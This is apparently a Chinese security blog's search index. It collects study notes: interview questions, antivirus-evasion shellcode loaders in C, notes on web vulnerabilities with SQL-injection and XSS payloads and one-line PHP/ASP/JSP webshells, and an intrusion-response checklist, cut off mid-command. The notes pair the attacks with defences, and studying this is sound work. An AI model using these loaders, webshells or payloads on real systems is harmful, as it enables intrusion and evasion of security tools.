<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>面筋</title>
      <link href="/2022/09/01/%E9%9D%A2%E7%AD%8B/"/>
      <url>/2022/09/01/%E9%9D%A2%E7%AD%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="绿盟安全运营"><a href="#绿盟安全运营" class="headerlink" title="绿盟安全运营"></a>绿盟安全运营</h2><ol><li>什么告警能一下子看出他是哪些漏洞？能把关键的字符写出来吗</li><li>你了解哪些常见的漏洞，一般是怎么利用实现的</li><li>SQL注入怎么在不知道用户名情况下绕过登录，不能爆破</li><li>一句话木马格式是怎么样的，你能写出来几个，说他的功能。</li><li>如果发现客户那边存在某个漏洞，你怎么和客户提整改建议呢？</li><li>你平时是怎么学习这些安全方面的知识的</li></ol><h2 id="奇安信渗透测试工程师"><a href="#奇安信渗透测试工程师" class="headerlink" title="奇安信渗透测试工程师"></a>奇安信渗透测试工程师</h2><ol><li><p>讲讲shiro反序列化<br>shiro-550<br>AES密钥固定，可以通过密钥爆破获取AES的密钥</p><p> payload:<br> 命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p><p> shiro-721反序列化<br> AES密钥随机，在持有合法RememberMe Cookie可以通过padding oracle attack构造RememberMe 触发反序列化攻击</p></li><li><p>讲讲fastjson反序列化<br>@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值<br>通过修改任意类为JDNI相关，从而修改对应的属性值修改JDNI接口，进而实现RCE</p></li><li><p>讲讲struts2反序列化<br>OGNL, XML</p></li><li><p>应急流程</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>免杀-白名单篇</title>
      <link href="/2022/08/07/%E5%85%8D%E6%9D%80-%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/"/>
      <url>/2022/08/07/%E5%85%8D%E6%9D%80-%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是白名单程序"><a href="#什么是白名单程序" class="headerlink" title="什么是白名单程序"></a>什么是白名单程序</h2><ol><li>带有Microsoft签名的二进制文件，或者Microsoft系统目录中二进制文件。</li><li>第三方认证签名程序</li><li>具有APT或红队渗透方有用的功能</li><li>该程序除了正常的功能外，可以做意料之外的行为。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>免杀-代码篇</title>
      <link href="/2022/07/19/%E5%85%8D%E6%9D%80-%E4%BB%A3%E7%A0%81%E7%AF%87/"/>
      <url>/2022/07/19/%E5%85%8D%E6%9D%80-%E4%BB%A3%E7%A0%81%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="comment">//使得windows控制台程序不出黑窗口</span></span><br></pre></td></tr></table></figure><h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))&amp;buf)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="申请动态内存加载"><a href="#申请动态内存加载" class="headerlink" title="申请动态内存加载"></a>申请动态内存加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *Memory;</span><br><span class="line">    Memory=VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌入汇编加载"><a href="#嵌入汇编加载" class="headerlink" title="嵌入汇编加载"></a>嵌入汇编加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//data段可读写</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,offset buf</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="type">void</span>(WINAPI*)(<span class="type">void</span>))&amp;buf)()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="汇编花指令"><a href="#汇编花指令" class="headerlink" title="汇编花指令"></a>汇编花指令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//data段可读写</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,offset buf</span><br><span class="line">        _emit <span class="number">0xFF</span></span><br><span class="line">        _emit <span class="number">0xE0</span> <span class="comment">//相当于jmp eax</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;encryptedShellcode&quot;</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;L1ang&quot;</span>;</span><br><span class="line">    <span class="type">char</span> cipherType[] = <span class="string">&quot;xor&quot;</span>;</span><br><span class="line">    <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="keyword">sizeof</span> key - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    ((<span class="type">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> 代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB常见漏洞</title>
      <link href="/2022/07/14/WEBvul/"/>
      <url>/2022/07/14/WEBvul/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>定义：由于程序中对用户输入检查不严格，用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。<br>本质：对于输入检查不充分，导致SQL语句将用户提交的非法数据当作语句的一部分来执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name=$_POST[&#x27;username&#x27;];</span><br><span class="line">$pwd=$_POST[&#x27;password&#x27;];</span><br><span class="line">$sql=&quot;select * from admin where user=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br><span class="line">$query=mysql_query($sql)</span><br></pre></td></tr></table></figure><p>构造payload：1’ or ‘1’ &#x3D;’1 时：<br>select * from admin where user&#x3D;’admin’ and password&#x3D;’1’ or ‘1’ &#x3D;1’<br>数字型：输入参数为整型。<br>字符型：输入参数为字符串。<br>sqlmap常用命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u 注入点 --dbs</span><br><span class="line">python sqlmap.py -r request.txt --dbs</span><br><span class="line">python sqlmap.py -u 注入点 -D 数据库名 --tables</span><br><span class="line">python sqlmap.py -u 注入点 -D 数据库名 -T 表名 --columns</span><br><span class="line">python sqlmap.py -u 注入点 -D 数据库名 -T 表名 -C 列名 --dump</span><br></pre></td></tr></table></figure><p>防御：</p><ol><li>关闭应用的错误提示</li><li>加waf</li><li>对输入进行过滤</li><li>限制输入长度</li><li>限制好数据库的权限</li><li>对sql语句进行预编译处理</li><li>对数据库数据进行信息加密</li></ol><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>定义：当攻击者使用Web应用程序将恶意代码发送给不同的最终用户时，就会发生XSS攻击。允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序反映用户输入而无需验证或编码的任何地方</p><p>本质：由于WEB服务端读取了用户可控数据输出到HTML页面的过程没有进行安全处理导致的。<br>反射型：存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码一般不存储到服务端。<br>存储型：这是利用起来最方便的跨站类型，跨站代码存储于服务端<br>DOM：这是由于客户端脚本自身解析不正确导致的安全问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;script&gt;prompt(/XSS/)&lt;/script&gt;</span><br><span class="line">&lt;IMG onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IFRAME.src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width:expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br></pre></td></tr></table></figure><p>修复方案：<br>对输出数据使用HTMLEncode对一些字符做转义处理<br>全局拦截，适用于不包含富文本的情况<br>富文本交互，白名单过滤</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>定义：利用上传漏洞可以把ASP，PHP等格式的木马直接上传至网站目录内，一旦上传成功，可以立刻得到WEBSHELL权限<br>本质：服务器端没有对用户上传的文件类型做校验或者校验不完整，导致用户可以上传恶意脚本到服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//asp</span><br><span class="line">&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line">//php</span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">//aspx</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line">jsp</span><br><span class="line">&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;</span><br></pre></td></tr></table></figure><p>客户端校验：</p><ul><li>JavaScript校验等————修改客户端代码&#x2F;上传过程修改数据包</li></ul><p>服务端校验：</p><ul><li>MIME类型————上传过程修改MIME类型</li><li>文件内容————上传图片木马&#x2F;代码混淆</li><li>扩展名校验————特殊扩展名&#x2F;截断上传&#x2F;解析漏洞等</li></ul><p>防御：</p><ul><li>服务端采用白名单方式检查文件扩展名。</li><li>上传的文件名随机命名</li><li>上传文件的目录必须是http请求无法直接访问到的，如果需要访问的，必须上传到其他域名下，并设置该目录为不解析脚本语言的目录</li><li>上传文件需要做日志记录</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ul><p>include与require的区别：<br>include只有当代码执行到此函数时才将文件包含进来，而require只要程序执行就立即调用此函数包含文件。</p><p>防御：</p><ul><li>禁止远程文件包含allow_url_include&#x3D;off</li><li>配置open_basedir&#x3D;指定目录，限制访问区域</li><li>过滤..&#x2F;等特殊字符</li><li>修改apache日志文件的存放地址</li><li>开启魔术引号magic_quotes_qpc&#x3D;on</li><li>尽量不要使用动态变量调用文件，直接写要包含的文件</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>原理：CSRF跨站点请求伪造。攻击者盗用了受害者的身份，以受害主的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作。</p><p>防护：</p><ol><li>尽量使用POST，限制GET</li><li>验证http referer字段，确认源地址</li><li>添加token验证</li><li>将 cookie设置为 HttpOnly</li></ol><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>原理：利用一个可以发起网络请求的服务当作跳板来攻击内部其他任务</p><ul><li>file: 查看文件</li><li>dict: 协议探测端口</li><li>ophergopher: 支持GET&amp;POST请求</li></ul><p>防御：</p><ul><li>地址做白名单处理</li><li>域名识别IP，过滤内部IP</li><li>校验返回的内容对比是否与假定的一致</li></ul><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>常见类型：<br>交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>原理: 解析用户传入的xml</p><p>防御：</p><ul><li>过滤用户提交的XML数据<br>libxml_disable_entity_loader&#x3D;true</li></ul><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><p>原理：没有对接口输入的内容进行严格的判断，使得攻击者能精心构造代码进行非法执行</p><p>常见函数：</p><ul><li>php：eval assert</li><li>python: exec</li><li>asp: &lt;%&#x3D;CreateObject(“wscript.shell”).exec(“cmd.exe &#x2F;c ipconfig”). StdOut. ReadAll()%&gt;</li></ul><p>防御：</p><ul><li>使用json保存数组，这样读取时就不需要使用eval了</li><li>对于必须使用eval的地方，一定要严格处理用户数据</li><li>字符串使用单引号包括可控代码，插入前使用addslashes进行转义</li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入侵检测排查</title>
      <link href="/2022/07/11/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8E%92%E6%9F%A5/"/>
      <url>/2022/07/11/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://s.threatbook.cn/</span><br><span class="line">https://www.virustotal.com/gui/home/upload</span><br></pre></td></tr></table></figure><h2 id="IP溯源"><a href="#IP溯源" class="headerlink" title="IP溯源"></a>IP溯源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.com/</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anop</span><br></pre></td></tr></table></figure><p>查看监听，是否存在异常监听端口<br>定位可疑的ESTABLISHED（ESTABLISHED表示TCP连接成功）</p><h3 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h3><p>进程排查工具：<br><a href="https://processhacker.sourceforge.io/">process hacker</a><br>重点排查进程：</p><ol><li>网络连接中可疑ESTABLISHED的PID进程</li><li>svchost.exe</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 判断文件目录地址是否存在于%systemroot%\System32</span><br><span class="line">- tasklist/svc命令查看svchost.exe右边的服务是否‘暂缺’</span><br><span class="line">- 是否有调用可疑动态链接库（右键-属性 查看command line）</span><br></pre></td></tr></table></figure><h3 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h3><ol><li><p>排查最近访问文件：%UserProfile%\Recent，查看是否存在危险文件，分析功能即可</p></li><li><p>对WWW中存在的webshell位置进行排查（D盾）</p></li></ol><h3 id="后门文件"><a href="#后门文件" class="headerlink" title="后门文件"></a>后门文件</h3><p>对可疑文件进行分析：</p><ol><li>创建时间</li><li>位置</li><li>是否存在外连行为</li><li>执行内容</li></ol><h3 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h3><p>使用<a href="https://www.d99net.net/">D盾</a>查看是否存在克隆账号</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user // 查看系统账户</span><br><span class="line"><span class="built_in">net</span> user username // 查看用户具体信息</span><br></pre></td></tr></table></figure><p>注册表排查<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names<br>是否存在隐藏用户</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务排查工具：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a></p><p>分析计划任务所执行的内容</p><h3 id="自启动项"><a href="#自启动项" class="headerlink" title="自启动项"></a>自启动项</h3><p>自启动项排查工具：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a><br>分析自启动项所执行的内容</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><h4 id="排查web日志"><a href="#排查web日志" class="headerlink" title="排查web日志"></a>排查web日志</h4><p>web日志排查工具：<a href="https://www.apacheviewer.com/">http_log_view</a> 360星图<br>根据webshell上传事件去检索日志，对攻击者的ip进行溯源</p><h4 id="排查mysql日志"><a href="#排查mysql日志" class="headerlink" title="排查mysql日志"></a>排查mysql日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;log_%&#x27;; </span><br></pre></td></tr></table></figure><h4 id="排查系统登录日志"><a href="#排查系统登录日志" class="headerlink" title="排查系统登录日志"></a>排查系统登录日志</h4><ul><li>事件查看器-Windows日志-安全</li><li>事件ID：4624-系统登录成功</li><li>登录类型：10-远程交互</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>排查浏览器的下载记录</li><li>排查其他用户的桌面或文件夹中是否存在可疑文件</li></ol><h3 id="webshell排查"><a href="#webshell排查" class="headerlink" title="webshell排查"></a>webshell排查</h3><p>webshell排查工具：<a href="https://www.d99net.net/">D盾</a></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="网络连接-1"><a href="#网络连接-1" class="headerlink" title="网络连接"></a>网络连接</h3><p>对内: 敏感服务&#x2F;端口：22，445，3389。(stat&#x3D;SYN?)<br>对外：非常规服务端口，高端口，云主机IP等等</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp(显示全部网络连接)</span><br><span class="line">netstat -tlnp(TCP监听)</span><br><span class="line">netstat -tnp(TCP连接)</span><br><span class="line">netstat -unp(UDP连接)</span><br><span class="line">netstat -tnp -c <span class="number">1</span>|grep SYN/<span class="built_in">TIME</span>/ESTAB(以<span class="number">1</span>s的频率执行netstat)</span><br><span class="line">lsof -i(显示全部网络连接，可以观察到对应的进程与用户)</span><br></pre></td></tr></table></figure><h3 id="异常进程-1"><a href="#异常进程-1" class="headerlink" title="异常进程"></a>异常进程</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef/-<span class="built_in">aux</span> //二者的输出结果大致相同，风格不同，<span class="built_in">aux</span>会截断command，ef不会</span><br></pre></td></tr></table></figure><p>关注内容：</p><ul><li>进程特征：参数、路径、名称、资源占用</li><li>操作特征：网络特征、行为特征(CMD)</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top //查看资源占用</span><br></pre></td></tr></table></figure><h3 id="敏感目录-1"><a href="#敏感目录-1" class="headerlink" title="敏感目录"></a>敏感目录</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><ul><li>&#x2F;tmp</li><li>&#x2F;var&#x2F;tmp</li><li>&#x2F;dev&#x2F;shm</li></ul><h3 id="后门文件-1"><a href="#后门文件-1" class="headerlink" title="后门文件"></a>后门文件</h3><h4 id="ssh后门"><a href="#ssh后门" class="headerlink" title="ssh后门"></a>ssh后门</h4><p>查看进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp|grep -E &quot;chfn|su|chsh&quot; //找到异常端口及进程</span><br></pre></td></tr></table></figure><p>定位文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span>|grep 进程号 //通过进程找异常文件</span><br></pre></td></tr></table></figure><p>删除文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm –f 文件<span class="built_in">path</span></span><br></pre></td></tr></table></figure><h3 id="后门账号-1"><a href="#后门账号-1" class="headerlink" title="后门账号"></a>后门账号</h3><h4 id="账号后门"><a href="#账号后门" class="headerlink" title="账号后门"></a>账号后门</h4><p>cat &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc&#x2F;shadow<br>stat &#x2F;etc&#x2F;passwd<br>stat &#x2F;etc&#x2F;shadown<br>awk -F: ‘{if($3&#x3D;&#x3D;0)print $1}’ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;打印root权限的user</p><h4 id="密钥后门"><a href="#密钥后门" class="headerlink" title="密钥后门"></a>密钥后门</h4><p>cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep  PubkeyAuthentication &#x2F;&#x2F;是否为yes<br>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys &#x2F;&#x2F;查看是否被修改</p><h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><p>&#x2F;var&#x2F;log&#x2F;cron &#x2F;&#x2F;计划任务日志</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;CROND&quot; cron //查看历史执行记录</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> 